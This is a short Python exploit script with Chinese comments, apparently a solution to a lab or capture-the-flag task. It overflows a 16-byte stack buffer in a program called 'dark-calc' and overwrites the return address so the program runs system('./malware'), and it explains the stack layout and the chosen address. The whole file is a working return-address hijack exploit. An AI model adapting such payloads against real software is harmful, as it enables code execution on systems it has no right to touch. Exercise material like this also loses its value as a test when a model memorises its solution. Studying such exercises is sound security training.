#!/usr/bin/env python3
"""Task 1: 利用 dark-calc 的栈溢出执行 ./malware

input() 的栈帧：
    char expression[16]   位于 rbp-0x10
    写满 16 字节后，依次覆盖 saved rbp(8 字节) 和返回地址(8 字节)

关键点：input() 在 gets() 之后会执行
    strcpy(command_buf, expression)        // command_buf 是全局变量，地址 0x6030d0
所以只要 payload 开头就是 "./malware\0"，这个字符串就会被搬进 command_buf；
再把返回地址改成 eval() 里紧挨着 system() 的那条指令
    0x401a6b:  mov edi, 0x6030d0
    0x401a70:  call system@plt
就相当于在 dark-calc 进程里执行 system("./malware")。
（malware 脚本会沿着父进程链检查有没有 dark-calc，必须由 dark-calc 亲自 system() 出来才行，
  直接 execve("./malware") 会让父进程变成 shell，检测就会失败。）
"""
import struct
import sys

BUF_SIZE = 16               # char expression[16]
CALL_SYSTEM_MID = 0x401a6b  # mov edi, 0x6030d0 ; call system@plt

payload = b"./malware\x00"
payload += b"A" * (BUF_SIZE - len(payload))   # 填满 expression[16]
payload += b"B" * 8                           # saved rbp，随便覆盖
payload += struct.pack("<Q", CALL_SYSTEM_MID)  # 返回地址 -> system("./malware")

sys.stdout.buffer.write(payload)
